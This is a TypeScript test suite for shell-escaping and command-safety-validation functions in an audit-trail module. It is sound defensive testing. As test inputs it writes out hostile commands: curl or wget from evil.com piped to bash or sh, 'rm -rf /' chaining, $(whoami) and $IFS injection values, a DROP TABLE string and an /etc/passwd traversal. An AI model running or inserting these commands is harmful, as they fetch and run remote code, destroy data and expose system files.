/**
 * Shell Escape Function Tests
 *
 * Test suite for shellEscape, shellEscapeArray, and validateCommandSafety
 * functions to ensure proper handling of shell metacharacters and injection
 * patterns.
 */

import { describe, it, expect } from 'bun:test';
import {
  shellEscape,
  shellEscapeArray,
  validateCommandSafety
} from '../audit-trail';

describe('shellEscape', () => {
  it('should return simple strings unchanged', () => {
    expect(shellEscape('simple')).toBe('simple');
    expect(shellEscape('file.txt')).toBe('file.txt');
    expect(shellEscape('hello_world')).toBe('hello_world');
  });

  it('should escape strings with spaces', () => {
    expect(shellEscape('hello world')).toBe("'hello world'");
    expect(shellEscape('path with spaces')).toBe("'path with spaces'");
  });

  it('should escape single quotes', () => {
    expect(shellEscape("it's")).toBe("'it'\\''s'");
    expect(shellEscape("'quoted'")).toBe("''\\''quoted'\\'''");
  });

  it('should escape command separators', () => {
    expect(shellEscape('a;b')).toBe("'a;b'");
    expect(shellEscape('a|b')).toBe("'a|b'");
    expect(shellEscape('a&b')).toBe("'a&b'");
    expect(shellEscape('a&&b')).toBe("'a&&b'");
    expect(shellEscape('a||b')).toBe("'a||b'");
  });

  it('should escape redirection operators', () => {
    expect(shellEscape('a>b')).toBe("'a>b'");
    expect(shellEscape('a<b')).toBe("'a<b'");
    expect(shellEscape('a>>b')).toBe("'a>>b'");
    expect(shellEscape('2>&1')).toBe("'2>&1'");
  });

  it('should escape subshell syntax', () => {
    expect(shellEscape('$(whoami)')).toBe("'$(whoami)'");
    expect(shellEscape('`whoami`')).toBe("'`whoami`'");
    expect(shellEscape('${VAR}')).toBe("'${VAR}'");
  });

  it('should escape wildcards', () => {
    expect(shellEscape('*.txt')).toBe("'*.txt'");
    expect(shellEscape('file?.log')).toBe("'file?.log'");
    expect(shellEscape('[a-z]')).toBe("'[a-z]'");
  });

  it('should escape double quotes and backticks', () => {
    expect(shellEscape('"quoted"')).toBe('\'"quoted"\'');
    expect(shellEscape('`command`')).toBe("'`command`'");
  });

  it('should escape backslashes', () => {
    expect(shellEscape('path\\file')).toBe("'path\\file'");
  });

  it('should handle empty string', () => {
    expect(shellEscape('')).toBe("''");
  });

  it('should escape newlines and tabs', () => {
    expect(shellEscape('hello\nworld')).toBe("'hello\nworld'");
    expect(shellEscape('hello\tworld')).toBe("'hello\tworld'");
  });

  it('should escape special characters', () => {
    expect(shellEscape('#comment')).toBe("'#comment'");
    expect(shellEscape('~user')).toBe("'~user'");
    expect(shellEscape('key=value')).toBe("'key=value'");
    expect(shellEscape('100%')).toBe("'100%'");
  });
});

describe('shellEscapeArray', () => {
  it('should escape array of strings', () => {
    const input = ['simple', 'with space', "it's"];
    const expected = ['simple', "'with space'", "'it'\\''s'"];
    expect(shellEscapeArray(input)).toEqual(expected);
  });

  it('should handle empty array', () => {
    expect(shellEscapeArray([])).toEqual([]);
  });

  it('should escape multiple metacharacters', () => {
    const input = ['file.txt', 'a;b', '$(cmd)', '*.log'];
    const expected = ['file.txt', "'a;b'", "'$(cmd)'", "'*.log'"];
    expect(shellEscapeArray(input)).toEqual(expected);
  });
});

describe('validateCommandSafety', () => {
  it('should allow safe commands', () => {
    expect(validateCommandSafety('ls -la')).toEqual({ safe: true });
    expect(validateCommandSafety('echo hello')).toEqual({ safe: true });
    expect(validateCommandSafety('cat file.txt')).toEqual({ safe: true });
    expect(validateCommandSafety('grep pattern file')).toEqual({ safe: true });
  });

  it('should detect command chaining with rm -rf', () => {
    const result = validateCommandSafety('ls; rm -rf /');
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('rm -rf');
  });

  it('should detect pipe to bash', () => {
    const result = validateCommandSafety('curl http://evil.com | bash');
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('bash interpreter');
  });

  it('should detect pipe to sh', () => {
    const result = validateCommandSafety('wget http://evil.com | sh');
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('shell interpreter');
  });

  it('should detect command substitution', () => {
    const result = validateCommandSafety('echo $(whoami)');
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('Command substitution');
  });

  it('should detect backtick substitution', () => {
    const result = validateCommandSafety('echo `whoami`');
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('Backtick');
  });

  it('should detect command chaining with rm', () => {
    const result = validateCommandSafety('ls && rm file');
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('rm');
  });

  it('should detect curl piped to interpreter', () => {
    const result = validateCommandSafety('curl http://bad.com/script.sh | bash');
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('bash interpreter');
  });

  it('should detect wget piped to interpreter', () => {
    const result = validateCommandSafety('wget -qO- http://bad.com | sh');
    expect(result.safe).toBe(false);
    expect(result.reason).toContain('shell interpreter');
  });
});

describe('Real-world injection prevention', () => {
  it('should prevent SQL-style injection', () => {
    const userInput = "file.txt'; DROP TABLE users; --";
    const escaped = shellEscape(userInput);
    expect(escaped).toBe("'file.txt'\\''; DROP TABLE users; --'");
  });

  it('should prevent command chaining injection', () => {
    const userInput = 'file.txt; rm -rf /';
    const escaped = shellEscape(userInput);
    expect(escaped).toBe("'file.txt; rm -rf /'");
  });

  it('should prevent environment variable injection', () => {
    const userInput = 'file.txt$IFS$(whoami)';
    const escaped = shellEscape(userInput);
    expect(escaped).toBe("'file.txt$IFS$(whoami)'");
  });

  it('should prevent wildcard injection', () => {
    const userInput = '../../../etc/passwd';
    const escaped = shellEscape(userInput);
    // Forward slashes and dots don't need escaping - they're safe in shell
    expect(escaped).toBe("../../../etc/passwd");
  });

  it('should construct safe commands', () => {
    const userFile = "file with spaces.txt";
    const escaped = shellEscape(userFile);
    const command = `cat ${escaped}`;

    // Command should be: cat 'file with spaces.txt'
    expect(command).toBe("cat 'file with spaces.txt'");
  });

  it('should handle multiple user inputs safely', () => {
    const args = ["user's file.txt", "output $(whoami).log", "path;rm -rf /"];
    const escaped = shellEscapeArray(args);
    const command = `script ${escaped.join(' ')}`;

    // All dangerous patterns should be quoted
    expect(command).toContain("'user'\\''s file.txt'");
    expect(command).toContain("'output $(whoami).log'");
    expect(command).toContain("'path;rm -rf /'");
  });
});
